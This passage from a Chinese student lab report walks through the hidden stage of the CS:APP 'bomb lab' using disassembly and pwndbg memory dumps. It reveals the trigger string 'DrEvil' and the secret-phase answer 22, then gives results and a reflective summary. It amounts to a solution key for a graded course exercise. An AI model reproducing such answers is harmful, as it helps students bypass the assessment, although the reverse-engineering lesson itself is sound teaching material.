<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_defused:</span><br><span class="line">   0x0000000000001fc9 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001fcd &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001fce &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001fd1 &lt;+8&gt;:	sub    rsp,0x70</span><br><span class="line">   0x0000000000001fd5 &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000001fde &lt;+21&gt;:	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000001fe2 &lt;+25&gt;:	xor    eax,eax</span><br><span class="line">   0x0000000000001fe4 &lt;+27&gt;:	mov    edi,0x1</span><br><span class="line">   0x0000000000001fe9 &lt;+32&gt;:	call   0x1d1b &lt;send_msg&gt;</span><br><span class="line">   0x0000000000001fee &lt;+37&gt;:	cmp    DWORD PTR [rip+0x3ab7],0x6        # 0x5aac &lt;num_input_strings&gt;</span><br><span class="line">   0x0000000000001ff5 &lt;+44&gt;:	je     0x2008 &lt;phase_defused+63&gt;</span><br><span class="line">   0x0000000000001ff7 &lt;+46&gt;:	mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x0000000000001ffb &lt;+50&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000002004 &lt;+59&gt;:	jne    0x2083 &lt;phase_defused+186&gt;</span><br><span class="line">   0x0000000000002006 &lt;+61&gt;:	leave  </span><br><span class="line">   0x0000000000002007 &lt;+62&gt;:	ret    </span><br><span class="line">   0x0000000000002008 &lt;+63&gt;:	lea    rcx,[rbp-0x64]</span><br><span class="line">   0x000000000000200c &lt;+67&gt;:	lea    rdx,[rbp-0x68]</span><br><span class="line">   0x0000000000002010 &lt;+71&gt;:	lea    r8,[rbp-0x60]</span><br><span class="line">   0x0000000000002014 &lt;+75&gt;:	lea    rsi,[rip+0x13d4]        # 0x33ef</span><br><span class="line">   0x000000000000201b &lt;+82&gt;:	lea    rdi,[rip+0x3b8e]        # 0x5bb0 &lt;input_strings+240&gt;</span><br><span class="line">   0x0000000000002022 &lt;+89&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000002027 &lt;+94&gt;:	call   0x12c0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000000202c &lt;+99&gt;:	cmp    eax,0x3</span><br><span class="line">   0x000000000000202f &lt;+102&gt;:	je     0x204b &lt;phase_defused+130&gt;</span><br><span class="line">   0x0000000000002031 &lt;+104&gt;:	lea    rdi,[rip+0x1278]        # 0x32b0</span><br><span class="line">   0x0000000000002038 &lt;+111&gt;:	call   0x1200 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000000203d &lt;+116&gt;:	lea    rdi,[rip+0x129c]        # 0x32e0</span><br><span class="line">   0x0000000000002044 &lt;+123&gt;:	call   0x1200 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000002049 &lt;+128&gt;:	jmp    0x1ff7 &lt;phase_defused+46&gt;</span><br><span class="line">   0x000000000000204b &lt;+130&gt;:	lea    rdi,[rbp-0x60]</span><br><span class="line">   0x000000000000204f &lt;+134&gt;:	lea    rsi,[rip+0x13a2]        # 0x33f8</span><br><span class="line">   0x0000000000002056 &lt;+141&gt;:	call   0x1b86 &lt;strings_not_equal&gt;</span><br><span class="line">   0x000000000000205b &lt;+146&gt;:	test   eax,eax</span><br><span class="line">   0x000000000000205d &lt;+148&gt;:	jne    0x2031 &lt;phase_defused+104&gt;</span><br><span class="line">   0x000000000000205f &lt;+150&gt;:	lea    rdi,[rip+0x11ea]        # 0x3250</span><br><span class="line">   0x0000000000002066 &lt;+157&gt;:	call   0x1200 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000000206b &lt;+162&gt;:	lea    rdi,[rip+0x1206]        # 0x3278</span><br><span class="line">   0x0000000000002072 &lt;+169&gt;:	call   0x1200 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000002077 &lt;+174&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000000207c &lt;+179&gt;:	call   0x1a70 &lt;secret_phase&gt;</span><br><span class="line">   0x0000000000002081 &lt;+184&gt;:	jmp    0x2031 &lt;phase_defused+104&gt;</span><br><span class="line">   0x0000000000002083 &lt;+186&gt;:	call   0x1220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>查看这里的几个内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000205f &lt;+150&gt;:	lea    rdi,[rip+0x11ea]        # 0x3250</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x3250</span><br><span class="line">0x3250:	<span class="string">&quot;Curses, you&#x27;ve found the secret phase!&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000204f &lt;+134&gt;:	lea    rsi,[rip+0x13a2]        # 0x33f8</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x33f8</span><br><span class="line">0x33f8:	<span class="string">&quot;DrEvil&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000002014 &lt;+75&gt;:	lea    rsi,[rip+0x13d4]        # 0x33ef</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x33ef</span><br><span class="line">0x33ef:	<span class="string">&quot;%d %d %s&quot;</span></span><br></pre></td></tr></table></figure>
<p>显然有个地方是需要我们输入两个数字加一个字符串的，能输入两个数字的就是第四关，我们在其答案的后面添加上<code>DrEvil</code>，成功进入隐藏关卡</p>
<p><img src="/img/jj/bomblab/15.png" alt="img"></p>
<p>反汇编<code>secret_phase</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function secret_phase:</span><br><span class="line">   0x0000555555555a70 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000555555555a74 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000555555555a75 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000555555555a78 &lt;+8&gt;:	push   rbx</span><br><span class="line">   0x0000555555555a79 &lt;+9&gt;:	sub    rsp,0x8</span><br><span class="line">   0x0000555555555a7d &lt;+13&gt;:	call   0x555555555e84 &lt;read_line&gt;</span><br><span class="line">   0x0000555555555a82 &lt;+18&gt;:	mov    rdi,rax</span><br><span class="line">   0x0000555555555a85 &lt;+21&gt;:	mov    edx,0xa</span><br><span class="line">   0x0000555555555a8a &lt;+26&gt;:	mov    esi,0x0</span><br><span class="line">   0x0000555555555a8f &lt;+31&gt;:	call   0x5555555552a0 &lt;strtol@plt&gt;</span><br><span class="line">   0x0000555555555a94 &lt;+36&gt;:	mov    rbx,rax</span><br><span class="line">   0x0000555555555a97 &lt;+39&gt;:	lea    eax,[rax-0x1]</span><br><span class="line">   0x0000555555555a9a &lt;+42&gt;:	cmp    eax,0x3e8</span><br><span class="line">   0x0000555555555a9f &lt;+47&gt;:	ja     0x555555555acc &lt;secret_phase+92&gt;</span><br><span class="line">   0x0000555555555aa1 &lt;+49&gt;:	mov    esi,ebx</span><br><span class="line">   0x0000555555555aa3 &lt;+51&gt;:	lea    rdi,[rip+0x3aa6]        # 0x555555559550 &lt;n1&gt;</span><br><span class="line">   0x0000555555555aaa &lt;+58&gt;:	call   0x555555555a32 &lt;fun7&gt;</span><br><span class="line">   0x0000555555555aaf &lt;+63&gt;:	cmp    eax,0x2</span><br><span class="line">   0x0000555555555ab2 &lt;+66&gt;:	jne    0x555555555ad3 &lt;secret_phase+99&gt;</span><br><span class="line">   0x0000555555555ab4 &lt;+68&gt;:	lea    rdi,[rip+0x16c5]        # 0x555555557180</span><br><span class="line">   0x0000555555555abb &lt;+75&gt;:	call   0x555555555200 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555555ac0 &lt;+80&gt;:	call   0x555555555fc9 &lt;phase_defused&gt;</span><br><span class="line">   0x0000555555555ac5 &lt;+85&gt;:	add    rsp,0x8</span><br><span class="line">   0x0000555555555ac9 &lt;+89&gt;:	pop    rbx</span><br><span class="line">   0x0000555555555aca &lt;+90&gt;:	pop    rbp</span><br><span class="line">   0x0000555555555acb &lt;+91&gt;:	ret    </span><br><span class="line">   0x0000555555555acc &lt;+92&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555ad1 &lt;+97&gt;:	jmp    0x555555555aa1 &lt;secret_phase+49&gt;</span><br><span class="line">   0x0000555555555ad3 &lt;+99&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555ad8 &lt;+104&gt;:	jmp    0x555555555ab4 &lt;secret_phase+68&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>反汇编<code>fun7</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function fun7:</span><br><span class="line">   0x0000555555555a32 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000555555555a36 &lt;+4&gt;:	test   rdi,rdi</span><br><span class="line">   0x0000555555555a39 &lt;+7&gt;:	je     0x555555555a6a &lt;fun7+56&gt;</span><br><span class="line">   0x0000555555555a3b &lt;+9&gt;:	push   rbp</span><br><span class="line">   0x0000555555555a3c &lt;+10&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000555555555a3f &lt;+13&gt;:	mov    edx,DWORD PTR [rdi]</span><br><span class="line">   0x0000555555555a41 &lt;+15&gt;:	cmp    edx,esi</span><br><span class="line">   0x0000555555555a43 &lt;+17&gt;:	jg     0x555555555a4e &lt;fun7+28&gt;</span><br><span class="line">   0x0000555555555a45 &lt;+19&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000555555555a4a &lt;+24&gt;:	jne    0x555555555a5b &lt;fun7+41&gt;</span><br><span class="line">   0x0000555555555a4c &lt;+26&gt;:	pop    rbp</span><br><span class="line">   0x0000555555555a4d &lt;+27&gt;:	ret    </span><br><span class="line">   0x0000555555555a4e &lt;+28&gt;:	mov    rdi,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x0000555555555a52 &lt;+32&gt;:	call   0x555555555a32 &lt;fun7&gt;</span><br><span class="line">   0x0000555555555a57 &lt;+37&gt;:	add    eax,eax</span><br><span class="line">   0x0000555555555a59 &lt;+39&gt;:	jmp    0x555555555a4c &lt;fun7+26&gt;</span><br><span class="line">   0x0000555555555a5b &lt;+41&gt;:	mov    rdi,QWORD PTR [rdi+0x10]</span><br><span class="line">   0x0000555555555a5f &lt;+45&gt;:	call   0x555555555a32 &lt;fun7&gt;</span><br><span class="line">   0x0000555555555a64 &lt;+50&gt;:	lea    eax,[rax+rax*1+0x1]</span><br><span class="line">   0x0000555555555a68 &lt;+54&gt;:	jmp    0x555555555a4c &lt;fun7+26&gt;</span><br><span class="line">   0x0000555555555a6a &lt;+56&gt;:	mov    eax,0xffffffff</span><br><span class="line">   0x0000555555555a6f &lt;+61&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>先分析<code>secret_phase</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555aa1 &lt;+49&gt;:	mov    esi,ebx</span><br><span class="line">0x0000555555555aa3 &lt;+51&gt;:	lea    rdi,[rip+0x3aa6]        # 0x555555559550 &lt;n1&gt;</span><br><span class="line">0x0000555555555aaa &lt;+58&gt;:	call   0x555555555a32 &lt;fun7&gt;</span><br><span class="line">0x0000555555555aaf &lt;+63&gt;:	cmp    eax,0x2</span><br></pre></td></tr></table></figure>
<p>这里向<code>fun7</code>传了两个参数，并要求返回值为2，其中一个参数<code>esi</code>存的是我们输入的数，另一个是内存地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/56x 0x555555559550</span><br><span class="line">0x555555559550 &lt;n1&gt;:		0x00000024  0x00000000  0x00005570  0x00000000</span><br><span class="line">0x555555559560 &lt;n1+16&gt;:		0x00005590  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x555555559570 &lt;n21&gt;:		0x00000008  0x00000000  0x000055f0  0x00000000</span><br><span class="line">0x555555559580 &lt;n21+16&gt;:	0x000055b0  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x555555559590 &lt;n22&gt;:		0x00000032  0x00000000  0x000055d0  0x00000000</span><br><span class="line">0x5555555595a0 &lt;n22+16&gt;:	0x00005610  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x5555555595b0 &lt;n32&gt;:		0x00000016  0x00000000  0x000050c0  0x00000000</span><br><span class="line">0x5555555595c0 &lt;n32+16&gt;:	0x00005080  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x5555555595d0 &lt;n33&gt;:		0x0000002d  0x00000000  0x00005020  0x00000000</span><br><span class="line">0x5555555595e0 &lt;n33+16&gt;:	0x000050e0  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x5555555595f0 &lt;n31&gt;:		0x00000006  0x00000000  0x00005040  0x00000000</span><br><span class="line">0x555555559600 &lt;n31+16&gt;:	0x000050a0  0x00000000  0x00000000  0x00000000</span><br><span class="line">0x555555559610 &lt;n34&gt;:		0x0000006b  0x00000000  0x00005060  0x00000000</span><br><span class="line">0x555555559620 &lt;n34+16&gt;:	0x00005100  0x00000000  0x00000000  0x00000000</span><br></pre></td></tr></table></figure>
<p>这类似于树的结构，根据节点关系，可以画出如下图所示的树：</p>
<p><img src="https://pic3.zhimg.com/80/v2-9b3ac7a82463fe7a226d5ecb716386f2_720w.webp" alt="img"></p>
<p>根据对<code>fun7</code>函数的分析，想要返回2，推理出<code>22</code>是正确的结果</p>
<blockquote>
<p>22</p>
</blockquote>
<h2 id="四、实验结果："><a href="#四、实验结果：" class="headerlink" title="四、实验结果："></a>四、实验结果：</h2><ul>
<li><p>phase_1</p>
<p><img src="/img/jj/bomblab/16.png" alt="img"></p>
</li>
<li><p>phase_2</p>
<p><img src="/img/jj/bomblab/17.png" alt="img"></p>
</li>
<li><p>phase_3</p>
<p><img src="/img/jj/bomblab/18.png" alt="img"></p>
</li>
<li><p>phase_4</p>
<p><img src="/img/jj/bomblab/19.png" alt="img"></p>
</li>
<li><p>phase_5</p>
<p><img src="/img/jj/bomblab/20.png" alt="img"></p>
</li>
<li><p>phase_6</p>
<p><img src="/img/jj/bomblab/21.png" alt="img"></p>
</li>
<li><p>secret_phase</p>
<p><img src="/img/jj/bomblab/22.png" alt="img"></p>
<p><img src="/img/jj/bomblab/23.png" alt="img"></p>
</li>
</ul>
<h2 id="五、实验总结："><a href="#五、实验总结：" class="headerlink" title="五、实验总结："></a>五、实验总结：</h2><blockquote>
<ul>
<li>实验过程中，我经历了七个不同阶段的挑战，每个阶段都考察了机器级语言程序的不同方面，随着阶段的递增，难度也逐渐提升。在这个过程中，我深刻体会到了计算机科学中的一些重要概念，并从中获得了丰富的经验和收获。</li>
<li>在第一阶段的字符串比较中，我对字符串的处理有了更深入的了解，学会了如何有效地进行字符串比较操作。这为后续的阶段奠定了基础，也提升了我的编程技能。</li>
<li>第二阶段涉及循环结构，我学到了如何使用循环语句来处理复杂的任务，同时也加深了对程序执行流程的理解。这对于编写高效且可维护的代码至关重要。</li>
<li>在第三阶段，我面对条件和分支结构，包括switch语句的运用。这使我更加熟悉如何根据不同的情况执行不同的代码段，提高了我的程序设计灵活性。</li>
<li>第四阶段涉及递归调用和栈的使用，这是一个相对较复杂的部分。通过解决这一阶段的问题，我深入了解了递归的原理和栈的运作机制，为处理更加复杂的程序问题打下了基础。</li>
<li>指针是编程中一个重要而复杂的概念，在第五阶段，我深入研究了指针的应用。这帮助我更好地理解内存管理和数据结构，为高效的内存操作提供了技能支持。</li>
<li>第六阶段涉及链表、指针和结构的操作，这对于处理更加复杂的数据结构和算法问题至关重要。我通过这一阶段的实践，掌握了处理复杂数据结构的技能。</li>
<li>在实验的隐藏阶段，我面对了一些挑战，特别是在处理阶段四之后附加特定字符串的情况。这要求我灵活运用之前学到的知识，解决问题的能力得到了锻炼。</li>
<li>总的来说，通过这个实验，我不仅加深了对机器级语言程序设计的理解，还提高了解决复杂问题的能力。在未来的学习和工作中，我将继续运用这些经验和技能，不断提升自己在计算机科学领域的水平。这次实验是一次深刻的学习过程，为我未来的编程生涯打下了坚实的基础。</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>实验报告</tag>
        <tag>计算机系统基础</tag>
        <tag>计基</tag>
        <tag>拆弹</tag>
      </tags>
  </entry>
</search>
